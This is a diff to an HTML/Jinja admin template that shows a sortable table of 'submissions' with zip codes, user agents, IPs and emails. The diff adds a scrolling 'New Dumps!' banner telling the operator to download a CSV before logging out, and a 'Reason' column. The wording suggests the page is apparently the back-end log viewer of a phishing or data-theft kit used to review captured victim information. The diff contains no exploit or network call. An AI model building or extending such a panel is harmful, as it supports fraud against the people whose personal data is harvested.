@@ -80,6 +80,15 @@
             from { text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00; }
             to { text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00; }
         }
+        .banner-text {
+            animation: scroll 10s linear infinite;
+            white-space: nowrap;
+            overflow: hidden;
+        }
+        @keyframes scroll {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
         .buttons {
             display: flex;
             justify-content: center;
@@ -164,13 +173,14 @@
                     <th onclick="sortTable(15)">Zip Code</th>
                     <th onclick="sortTable(16)">User Agent</th>
                     <th onclick="sortTable(17)">IP</th>
+                    <th onclick="sortTable(18)">Reason</th>  <!-- NEW: Reason column -->
                 </tr>
             </thead>
             <tbody>
                 {% for sub in submissions %}
-                {% if sub.new %}
-                <tr>
-                    <td colspan="18" class="banner-row">New Dumps!</td>
+                {% if loop.index0 == first_new_index and has_new_dumps %}
+                <tr class="banner-row">
+                    <td colspan="19"><div class="banner-text">New Dumps! Ensure to download CSV before logging out</div></td>  <!-- Updated colspan to 19 -->
                 </tr>
                 {% endif %}
                 <tr>
@@ -192,6 +202,7 @@
                     <td>{{ sub.zip_code }}</td>
                     <td>{{ sub.user_agent }}</td>
                     <td>{{ sub.ip }}</td>
+                    <td>{% if sub.email.startswith('N/A (') and sub.email.endswith(')') %}{{ sub.email[5:-1] }}{% else %}N/A{% endif %}</td>  <!-- NEW: Extract reason from email if N/A (reason), else N/A -->
                 </tr>
                 {% endfor %}
             </tbody>
